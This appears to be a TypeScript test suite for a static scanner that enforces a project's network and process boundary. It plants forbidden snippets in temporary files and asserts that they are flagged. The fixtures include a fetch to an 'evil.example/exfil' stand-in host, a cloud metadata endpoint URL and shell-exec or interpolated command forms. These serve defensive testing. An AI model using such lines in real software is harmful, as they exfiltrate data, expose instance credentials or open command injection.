// Suite 3 (network boundary), static half. The scanner is a mechanised rule, so it is tested by MUTATION: plant a
// forbidden construct in a fresh file in every directory of the real src/ tree and require the scanner to refuse it
// -- except in the one place the network exemption legitimately covers (and even there the HTTP-stack imports are
// still refused). The runtime half (host allowlist, redirects) is src/research/net/allowlist.test.ts.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { NETWORK_EXEMPT_PREFIX, scanBoundary } from "./boundary.ts";
import { runProcess } from "../util/exec.ts";

const REAL_SRC = new URL("../", import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, "$1");

async function srcDirs(dir = REAL_SRC, prefix = "src"): Promise<string[]> {
  const out: string[] = [prefix];
  for (const e of await readdir(dir, { withFileTypes: true })) {
    if (e.isDirectory()) out.push(...(await srcDirs(`${dir}/${e.name}`, `${prefix}/${e.name}`)));
  }
  return out;
}

async function tempRoot(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(`${tmpdir()}/osa-boundary-`);
  for (const [rel, text] of Object.entries(files)) {
    await mkdir(`${root}/${rel.slice(0, rel.lastIndexOf("/"))}`, { recursive: true });
    await writeFile(`${root}/${rel}`, text, "utf8");
  }
  return root;
}

const rulesIn = async (root: string, file: string): Promise<string[]> => [...new Set((await scanBoundary(root)).filter((v) => v.file === file).map((v) => v.rule))].sort();

test("the exemption is exactly one directory, declared once", () => {
  assert.equal(NETWORK_EXEMPT_PREFIX, "src/research/net/");
});

test("a request to a non-allowlisted host, planted in EVERY other src directory, is refused by the scanner (B3 + B4)", async () => {
  const dirs = (await srcDirs()).filter((d) => d !== "src/research/net");
  assert.ok(dirs.length >= 12, `expected the real tree's directories, found ${String(dirs.length)}`);
  for (const d of dirs) {
    const file = `${d}/probe.ts`;
    const root = await tempRoot({ [file]: 'export const grab = () => fetch("https://evil.example/exfil");\n' });
    assert.deepEqual(await rulesIn(root, file), ["B3", "B4"], `${d} may not reach any host`);
  }
});

test("every other way of reaching the network is refused outside the exemption: node:http/https/net/tls, undici, axios, XMLHttpRequest, a URL literal", async () => {
  const cases: Record<string, string> = {
    'import https from "node:https";': "B3",
    'import net from "node:net";': "B3",
    'import tls from "node:tls";': "B3",
    'import { request } from "undici";': "B3",
    'import axios from "axios";': "B3",
    "const x = new XMLHttpRequest();": "B3",
    'const u = "http://169.254.169.254/latest/meta-data";': "B4",
  };
  for (const [line, rule] of Object.entries(cases)) {
    const root = await tempRoot({ "src/osa/probe.ts": `${line}\n` });
    assert.ok((await rulesIn(root, "src/osa/probe.ts")).includes(rule), `${line} should trip ${rule}`);
  }
});

test("inside the exemption global fetch and URL literals are allowed, but an HTTP stack or a dependency is still refused (B9)", async () => {
  const ok = await tempRoot({ "src/research/net/probe.ts": 'export const g = () => fetch("https://api.github.com/x");\n' });
  assert.deepEqual(await rulesIn(ok, "src/research/net/probe.ts"), []);
  for (const line of ['import https from "node:https";', 'import axios from "axios";', 'import { fetch } from "undici";', "const x = new XMLHttpRequest();"]) {
    const root = await tempRoot({ "src/research/net/probe.ts": `${line}\n` });
    assert.deepEqual(await rulesIn(root, "src/research/net/probe.ts"), ["B9"], line);
  }
  // the exemption does not extend to a sibling directory with a similar name
  const sibling = await tempRoot({ "src/research/network/probe.ts": 'export const g = () => fetch("https://x.example");\n', "src/research/netx.ts": 'export const g = () => fetch("https://x.example");\n' });
  assert.deepEqual(await rulesIn(sibling, "src/research/network/probe.ts"), ["B3", "B4"]);
  assert.deepEqual(await rulesIn(sibling, "src/research/netx.ts"), ["B3", "B4"]);
});

test("B10: node:child_process may be imported only by src/util/exec.ts (static, require and dynamic forms)", async () => {
  const forms = ['import { spawn } from "node:child_process";', 'import cp from "child_process";', 'const cp = require("node:child_process");', 'const cp = await import("node:child_process");'];
  for (const d of ["src/code-index", "src/trim", "src/util", "src/research/net", "src/adapters"]) {
    for (const f of forms) {
      const root = await tempRoot({ [`${d}/probe.ts`]: `${f}\n` });
      assert.ok((await rulesIn(root, `${d}/probe.ts`)).includes("B10"), `${d}: ${f}`);
    }
  }
  const wrapper = await tempRoot({ "src/util/exec.ts": 'import { spawn } from "node:child_process";\nexport const s = spawn;\n' });
  assert.deepEqual(await rulesIn(wrapper, "src/util/exec.ts"), [], "the one sanctioned wrapper is exempt");
});

test("B11: a shell option or an exec-family call is refused outside the wrapper; a regex .exec() and noShellFallback are not mistaken for one", async () => {
  for (const line of ["spawn(cmd, args, { shell: true });", "execSync(`git log ${x}`);", "exec('ls');", "execFile('git', []);", "spawnSync('git', []);"]) {
    const root = await tempRoot({ "src/trim/probe.ts": `${line}\n` });
    assert.ok((await rulesIn(root, "src/trim/probe.ts")).includes("B11"), line);
  }
  for (const line of ["const m = /a/.exec(text);", "await runProcess({ command: bin, args, cwd, timeoutMs: 1, noShellFallback: true });", "const shell = false;", "// shell: true would be wrong"]) {
    const root = await tempRoot({ "src/trim/probe.ts": `${line}\n` });
    assert.ok(!(await rulesIn(root, "src/trim/probe.ts")).includes("B11"), line);
  }
});

test("B12: a spawned command built by interpolation or concatenation is refused; a literal or a plain variable is fine", async () => {
  for (const line of ["await runProcess({ command: `${dir}/bin/trim`, args: [] });", 'await runProcess({ command: "node " + file, args: [] });']) {
    const root = await tempRoot({ "src/trim/probe.ts": `${line}\n` });
    assert.ok((await rulesIn(root, "src/trim/probe.ts")).includes("B12"), line);
  }
  for (const line of ['await runProcess({ command: "git", args: [`log`, `${n}`] });', "await runProcess({ command: this.command, args: [] });", "await runProcess({ command: config.cbm.binaryPath, args });"]) {
    const root = await tempRoot({ "src/trim/probe.ts": `${line}\n` });
    assert.ok(!(await rulesIn(root, "src/trim/probe.ts")).includes("B12"), line);
  }
});

test("the real tree is clean under every rule, including the new ones", async () => {
  const repo = new URL("../../", import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, "$1");
  assert.deepEqual(await scanBoundary(repo), []);
});

test("noShellFallback: a missing native binary is never retried through cmd.exe -- exit code stays null (no shell was ever involved)", async () => {
  const r = await runProcess({ command: "osa-definitely-not-installed-binary", args: ["--x"], cwd: process.cwd(), timeoutMs: 10_000, noShellFallback: true });
  assert.equal(r.exitCode, null);
  assert.notEqual(r.timedOut, true);
});
